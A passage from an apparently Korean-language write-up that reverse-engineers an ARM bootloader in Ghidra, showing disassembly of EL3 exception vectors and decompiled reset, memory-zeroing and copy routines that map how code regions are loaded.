</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0000261</span>c <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>       <span style="color:#f92672">??</span>[<span style="color:#ae81ff">100</span>]
</span></span><span style="display:flex;"><span>                 <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span> 
</span></span><span style="display:flex;"><span>                 <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span> 
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">000026</span><span style="color:#ae81ff">80</span> a0  <span style="color:#ae81ff">01</span>  <span style="color:#ae81ff">80</span>  d2    mov        x0,<span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0xd</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">000026</span><span style="color:#ae81ff">84</span> d9  f9  ff  <span style="color:#ae81ff">97</span>    bl         FUN_00000de8                                     undefined <span style="color:#a6e22e">FUN_00000de8</span>()
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">000026</span><span style="color:#ae81ff">88</span> d6  f9  ff  <span style="color:#ae81ff">97</span>    bl         FUN_00000de0                                     undefined <span style="color:#a6e22e">FUN_00000de0</span>()
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">000026</span><span style="color:#ae81ff">8</span>c <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>    udf        <span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">000026</span><span style="color:#ae81ff">90</span> <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>       <span style="color:#f92672">??</span>[<span style="color:#ae81ff">112</span>]
</span></span><span style="display:flex;"><span>                 <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span> 
</span></span><span style="display:flex;"><span>                 <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span> 
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00002700</span> c0  <span style="color:#ae81ff">01</span>  <span style="color:#ae81ff">80</span>  d2    mov        x0,<span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0xe</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00002704</span> b9  f9  ff  <span style="color:#ae81ff">97</span>    bl         FUN_00000de8                                     undefined <span style="color:#a6e22e">FUN_00000de8</span>()
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0000270</span><span style="color:#ae81ff">8</span> b6  f9  ff  <span style="color:#ae81ff">97</span>    bl         FUN_00000de0                                     undefined <span style="color:#a6e22e">FUN_00000de0</span>()
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0000270</span>c <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>    udf        <span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00002710</span> <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>       <span style="color:#f92672">??</span>[<span style="color:#ae81ff">112</span>]
</span></span><span style="display:flex;"><span>                 <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span> 
</span></span><span style="display:flex;"><span>                 <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span> 
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">000027</span><span style="color:#ae81ff">80</span> e0  <span style="color:#ae81ff">01</span>  <span style="color:#ae81ff">80</span>  d2    mov        x0,<span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0xf</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">000027</span><span style="color:#ae81ff">84</span> <span style="color:#ae81ff">99</span>  f9  ff  <span style="color:#ae81ff">97</span>    bl         FUN_00000de8                                     undefined <span style="color:#a6e22e">FUN_00000de8</span>()
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">000027</span><span style="color:#ae81ff">88</span> <span style="color:#ae81ff">96</span>  f9  ff  <span style="color:#ae81ff">97</span>    bl         FUN_00000de0                                     undefined <span style="color:#a6e22e">FUN_00000de0</span>()
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">000027</span><span style="color:#ae81ff">8</span>c <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>    udf        <span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">000027</span><span style="color:#ae81ff">90</span> <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>       <span style="color:#f92672">??</span>[<span style="color:#ae81ff">112</span>]
</span></span><span style="display:flex;"><span>                 <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span> 
</span></span><span style="display:flex;"><span>                 <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span> 
</span></span><span style="display:flex;"><span>                             LAB_00002800                                    XREF[<span style="color:#ae81ff">2</span>]<span style="color:#f92672">:</span>     <span style="color:#ae81ff">00002414</span> (j) , <span style="color:#ae81ff">00002614</span> (j)   
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00002</span><span style="color:#ae81ff">800</span> <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">01</span>  <span style="color:#ae81ff">80</span>  d2    mov        x0,<span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0x8</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00002</span><span style="color:#ae81ff">804</span> <span style="color:#ae81ff">79</span>  f9  ff  <span style="color:#ae81ff">97</span>    bl         FUN_00000de8                                     undefined <span style="color:#a6e22e">FUN_00000de8</span>()
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00002</span><span style="color:#ae81ff">808</span> <span style="color:#ae81ff">76</span>  f9  ff  <span style="color:#ae81ff">97</span>    bl         FUN_00000de0                                     undefined <span style="color:#a6e22e">FUN_00000de0</span>()
</span></span><span style="display:flex;"><span>                             LAB_0000280c                                    XREF[<span style="color:#ae81ff">2</span>]<span style="color:#f92672">:</span>     <span style="color:#ae81ff">0000241</span><span style="color:#ae81ff">8</span> (j) , <span style="color:#ae81ff">0000261</span><span style="color:#ae81ff">8</span> (j)   
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00002</span><span style="color:#ae81ff">80</span>c c0  f9  ff  <span style="color:#ae81ff">97</span>    bl         FUN_00000f0c                                     undefined <span style="color:#a6e22e">FUN_00000f0c</span>(undefined
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00002</span><span style="color:#ae81ff">810</span> e5  <span style="color:#ae81ff">03</span>  <span style="color:#ae81ff">1f</span>  aa    mov        x5,xzr
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00002</span><span style="color:#ae81ff">814</span> e6  <span style="color:#ae81ff">03</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">91</span>    mov        x6,sp
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00002</span><span style="color:#ae81ff">818</span> cc  <span style="color:#ae81ff">88</span>  <span style="color:#ae81ff">40</span>  f9    ldr        x12 ,[x6, <span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0x110</span> ]
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00002</span><span style="color:#ae81ff">81</span>c bf  <span style="color:#ae81ff">40</span>  <span style="color:#ae81ff">00</span>  d5    msr        PState.SP,<span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00002</span><span style="color:#ae81ff">820</span> <span style="color:#ae81ff">9f</span>  <span style="color:#ae81ff">01</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">91</span>    mov        sp,x12
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00002</span><span style="color:#ae81ff">824</span> <span style="color:#ae81ff">10</span>  <span style="color:#ae81ff">40</span>  <span style="color:#ae81ff">3</span>e  d5    mrs        x16 ,spsr_el3
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00002</span><span style="color:#ae81ff">828</span> <span style="color:#ae81ff">31</span>  <span style="color:#ae81ff">40</span>  <span style="color:#ae81ff">3</span>e  d5    mrs        x17 ,elr_el3
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00002</span><span style="color:#ae81ff">82</span>c <span style="color:#ae81ff">12</span>  <span style="color:#ae81ff">11</span>  <span style="color:#ae81ff">3</span>e  d5    mrs        x18 ,scr_el3
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00002</span><span style="color:#ae81ff">830</span> d0  c4  <span style="color:#ae81ff">11</span>  a9    stp        x16 ,x17 ,[x6, <span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0x118</span> ]
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00002</span><span style="color:#ae81ff">834</span> d2  <span style="color:#ae81ff">80</span>  <span style="color:#ae81ff">00</span>  f9    str        x18 ,[x6, <span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0x100</span> ]
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00002</span><span style="color:#ae81ff">838</span> <span style="color:#ae81ff">47</span>  <span style="color:#ae81ff">02</span>  <span style="color:#ae81ff">40</span>  b3    bfxil      x7,x18 ,<span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0x0</span> ,<span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0x1</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00002</span><span style="color:#ae81ff">83</span>c <span style="color:#ae81ff">06</span>  f8  ff  <span style="color:#ae81ff">97</span>    bl         FUN_00000854                                     undefined <span style="color:#a6e22e">FUN_00000854</span>()
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00002</span><span style="color:#ae81ff">840</span> da  f9  ff  <span style="color:#ae81ff">17</span>    b          FUN_00000fa8                                     undefined <span style="color:#a6e22e">FUN_00000fa8</span>(undefined
</span></span><span style="display:flex;"><span>                             <span style="color:#f92672">--</span> Flow Override: <span style="color:#a6e22e">CALL_RETURN</span> (CALL_TERMINATOR)
</span></span><span style="display:flex;"><span>                             ARRAY_00002844[<span style="color:#ae81ff">12</span>]                              XREF[<span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">2</span>]<span style="color:#f92672">:</span>   FUN_0000055c:<span style="color:#ae81ff">0000057</span><span style="color:#ae81ff">8</span> (<span style="color:#f92672">*</span>) , 
</span></span><span style="display:flex;"><span>                             ARRAY_00002844                                               FUN_0000055c:<span style="color:#ae81ff">00000654</span> (<span style="color:#f92672">*</span>) , 
</span></span><span style="display:flex;"><span>                                                                                          <span style="color:#ae81ff">00001</span><span style="color:#ae81ff">950</span> (<span style="color:#f92672">*</span>) , Reset:<span style="color:#ae81ff">00000060</span> (<span style="color:#f92672">*</span>) , 
</span></span><span style="display:flex;"><span>                                                                                          <span style="color:#ae81ff">000000</span>d0 (<span style="color:#f92672">*</span>)   
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00002</span><span style="color:#ae81ff">844</span> <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>       <span style="color:#f92672">??</span>[<span style="color:#ae81ff">112</span>]
</span></span><span style="display:flex;"><span>                 <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span> 
</span></span><span style="display:flex;"><span>                 <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span> 
</span></span></code></pre></div><p>ghidra를 통해 적당히 0x80씩 더해가며 디스어셈블해보니 exception handler를 식별할 수 있었다.
대충 어떤식으로 분석을 시도해야하는지 알게 되었다.</p>
<p>그런데 지금 취약점을 찾아서 익스플로잇해야하는 부분은 EL3가 아닌 EL1이다.
일단 EL3의 exception vector를 찾았으니 나중을 위해 남겨두고 다시 부트로더를 분석해야한다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">Reset</span>(<span style="color:#66d9ef">void</span>)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  ulong uVar1;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  sctlr_el3 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x30c50830</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">InstructionSynchronizationBarrier</span>();
</span></span><span style="display:flex;"><span>  vbar_el3 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x2000</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">InstructionSynchronizationBarrier</span>();
</span></span><span style="display:flex;"><span>  uVar1 <span style="color:#f92672">=</span> sctlr_el3;
</span></span><span style="display:flex;"><span>  sctlr_el3 <span style="color:#f92672">=</span> uVar1 <span style="color:#f92672">|</span> <span style="color:#ae81ff">0x100a</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">InstructionSynchronizationBarrier</span>();
</span></span><span style="display:flex;"><span>  scr_el3 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x238</span>;
</span></span><span style="display:flex;"><span>  mdcr_el3 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x18000</span>;
</span></span><span style="display:flex;"><span>  uVar1 <span style="color:#f92672">=</span> daif;
</span></span><span style="display:flex;"><span>  daif <span style="color:#f92672">=</span> uVar1 <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xfffffffffffffeff</span>;
</span></span><span style="display:flex;"><span>  cptr_el3 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">FUN_00001004</span>(DAT_000000b8,DAT_000000c0);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">FUN_000010f4</span>(DAT_000000c8,PTR_DAT_000000d0,DAT_000000d8);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">FUN_000010f4</span>(DAT_000000e0,PTR_LAB_000000e8,PTR_LAB_000000e8);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">FUN_000010f4</span>(DAT_000000f0,PTR_DAT_000000f8,PTR_DAT_00000100);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">FUN_000010f4</span>(DAT_00000108,PTR_LAB_00000110,PTR_LAB_000000e8);
</span></span><span style="display:flex;"><span>  spsel <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">FUN_00000514</span>();
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">FUN_000007f4</span>();
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">FUN_00000fa8</span>();
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>대강 어떤 동작을 하고 있는지 이제 이해할 수 있다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">FUN_00001004</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>param_1,<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>param_2)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  undefined8 <span style="color:#f92672">*</span>puVar1;
</span></span><span style="display:flex;"><span>  undefined8 <span style="color:#f92672">*</span>puVar2;
</span></span><span style="display:flex;"><span>  undefined8 <span style="color:#f92672">*</span>puVar3;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  puVar2 <span style="color:#f92672">=</span> (undefined8 <span style="color:#f92672">*</span>)(param_1 <span style="color:#f92672">+</span> (<span style="color:#66d9ef">long</span>)param_2);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (((ulong)param_1 <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xf</span>) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>    puVar1 <span style="color:#f92672">=</span> (undefined8 <span style="color:#f92672">*</span>)(((ulong)param_1 <span style="color:#f92672">|</span> <span style="color:#ae81ff">0xf</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ((((ulong)param_1 <span style="color:#f92672">|</span> <span style="color:#ae81ff">0xf</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xffffffffffffffff</span>) <span style="color:#f92672">||</span>
</span></span><span style="display:flex;"><span>       (puVar3 <span style="color:#f92672">=</span> (undefined8 <span style="color:#f92672">*</span>)param_1, puVar2 <span style="color:#f92672">&lt;=</span> puVar1)) <span style="color:#66d9ef">goto</span> joined_r0x000010b4;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">do</span> {
</span></span><span style="display:flex;"><span>      param_1 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)((<span style="color:#66d9ef">long</span>)puVar3 <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">*</span>(undefined <span style="color:#f92672">*</span>)puVar3 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>      puVar3 <span style="color:#f92672">=</span> (undefined8 <span style="color:#f92672">*</span>)param_1;
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">while</span> ((undefined8 <span style="color:#f92672">*</span>)param_1 <span style="color:#f92672">!=</span> puVar1);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> (; param_1 <span style="color:#f92672">&lt;</span> (undefined8 <span style="color:#f92672">*</span>)((ulong)puVar2 <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xfffffffffffffff0</span>);
</span></span><span style="display:flex;"><span>      param_1 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)((<span style="color:#66d9ef">long</span>)param_1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10</span>)) {
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>(undefined8 <span style="color:#f92672">*</span>)param_1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>(undefined8 <span style="color:#f92672">*</span>)((<span style="color:#66d9ef">long</span>)param_1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>joined_r0x000010b4:
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> (; (undefined8 <span style="color:#f92672">*</span>)param_1 <span style="color:#f92672">!=</span> puVar2; param_1 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)((<span style="color:#66d9ef">long</span>)param_1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>)) {
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>param_1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>메모리를 0으로 초기화하는 작업을 수행한다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">FUN_000010f4</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>param_1,<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>param_2,ulong size)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  undefined8 uVar1;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> (; <span style="color:#ae81ff">0xf</span> <span style="color:#f92672">&lt;</span> size; size <span style="color:#f92672">=</span> size <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x10</span>) {
</span></span><span style="display:flex;"><span>    uVar1 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(undefined8 <span style="color:#f92672">*</span>)((<span style="color:#66d9ef">long</span>)param_2 <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>(undefined8 <span style="color:#f92672">*</span>)param_1 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(undefined8 <span style="color:#f92672">*</span>)param_2;
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>(undefined8 <span style="color:#f92672">*</span>)((<span style="color:#66d9ef">long</span>)param_1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>) <span style="color:#f92672">=</span> uVar1;
</span></span><span style="display:flex;"><span>    param_1 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)((<span style="color:#66d9ef">long</span>)param_1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10</span>);
</span></span><span style="display:flex;"><span>    param_2 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)((<span style="color:#66d9ef">long</span>)param_2 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">do</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (size <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>param_1 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>param_2;
</span></span><span style="display:flex;"><span>    size <span style="color:#f92672">=</span> size <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    param_1 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)((<span style="color:#66d9ef">long</span>)param_1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>    param_2 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)((<span style="color:#66d9ef">long</span>)param_2 <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">while</span> (size <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>두 번째는 단순히 복사하는 함수다.</p>
<p>정리하면 다음과 같이 표현할 수 있다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#a6e22e">memset</span>(<span style="color:#ae81ff">0xE002000</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x202000</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">memcpy</span>(<span style="color:#ae81ff">0xE000000</span>, <span style="color:#ae81ff">0x002850</span>, <span style="color:#ae81ff">0x68</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">memcpy</span>(<span style="color:#ae81ff">0x40100000</span>, <span style="color:#ae81ff">0x10000</span>, <span style="color:#ae81ff">0x10000</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">memcpy</span>(<span style="color:#ae81ff">0xE400000</span>, <span style="color:#ae81ff">0x20000</span>, <span style="color:#ae81ff">0x90000</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">memcpy</span>(<span style="color:#ae81ff">0x40000000</span>, <span style="color:#ae81ff">0xb0000</span>, <span style="color:#ae81ff">0x10000</span>)
</span></span></code></pre></div><p>EL3 코드는 코드 무결성을 위해 코드는 DRAM에 올라가지 않는다.
FLASH에서 동작한다.</p>
<p>0x10000를 확인했더니 다음과 같은 코드가 나왔다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>                             <span style="color:#f92672">*************************************************************</span>
</span></span><span style="display:flex;"><span>                             <span style="color:#f92672">*</span>                           FUNCTION                          
</span></span><span style="display:flex;"><span>                             <span style="color:#f92672">*************************************************************</span>
</span></span><span style="display:flex;"><span>                             undefined  <span style="color:#a6e22e">FUN_00010000</span> ()
</span></span><span style="display:flex;"><span>             undefined         w0:<span style="color:#ae81ff">1</span>           <span style="color:#f92672">&lt;</span>RETURN<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>                             FUN_00010000                                    XREF[<span style="color:#ae81ff">4</span>]<span style="color:#f92672">:</span>     Reset:<span style="color:#ae81ff">00000070</span> (<span style="color:#f92672">*</span>) , 
</span></span><span style="display:flex;"><span>                                                                                          Reset:<span style="color:#ae81ff">00000074</span> (<span style="color:#f92672">*</span>) , 
</span></span><span style="display:flex;"><span>                                                                                          Reset:<span style="color:#ae81ff">000000</span><span style="color:#ae81ff">94</span> (<span style="color:#f92672">*</span>) , <span style="color:#ae81ff">000</span>bc080 (<span style="color:#f92672">*</span>)   
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00010000</span> <span style="color:#ae81ff">00</span>  c0  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">10</span>    adr        x0,<span style="color:#ae81ff">0x11800</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00010004</span> <span style="color:#ae81ff">00</span>  c0  <span style="color:#ae81ff">1</span>c  d5    msr        vbar_el2 ,x0
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0001000</span><span style="color:#ae81ff">8</span> df  <span style="color:#ae81ff">3f</span>  <span style="color:#ae81ff">03</span>  d5    isb
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0001000</span>c <span style="color:#ae81ff">60</span>  <span style="color:#ae81ff">01</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">58</span>    ldr        x0,DAT_00010038
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00010010</span> <span style="color:#ae81ff">81</span>  <span style="color:#ae81ff">01</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">58</span>    ldr        x1<span style="color:#f92672">=&gt;</span>DAT_0000d000 ,PTR_DAT_00010040               <span style="color:#f92672">=</span> <span style="color:#ae81ff">0000</span>d000
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00010014</span> <span style="color:#ae81ff">13</span>  <span style="color:#ae81ff">02</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">94</span>    bl         FUN_00010860                                     undefined <span style="color:#a6e22e">FUN_00010860</span>()
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0001001</span><span style="color:#ae81ff">8</span> bf  <span style="color:#ae81ff">40</span>  <span style="color:#ae81ff">00</span>  d5    msr        PState.SP,<span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0001001</span>c <span style="color:#ae81ff">60</span>  <span style="color:#ae81ff">01</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">58</span>    ldr        x0,DAT_00010048                                  <span style="color:#f92672">=</span> <span style="color:#ae81ff">0000000040104040</span>h
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00010020</span> <span style="color:#ae81ff">1f</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">91</span>    mov        sp,x0
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">00010024</span> <span style="color:#ae81ff">0</span>b  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">94</span>    bl         FUN_00010050                                     undefined <span style="color:#a6e22e">FUN_00010050</span>()
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0001002</span><span style="color:#ae81ff">8</span> e2  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">94</span>    bl         FUN_000103b0                                     undefined <span style="color:#a6e22e">FUN_000103b0</span>()
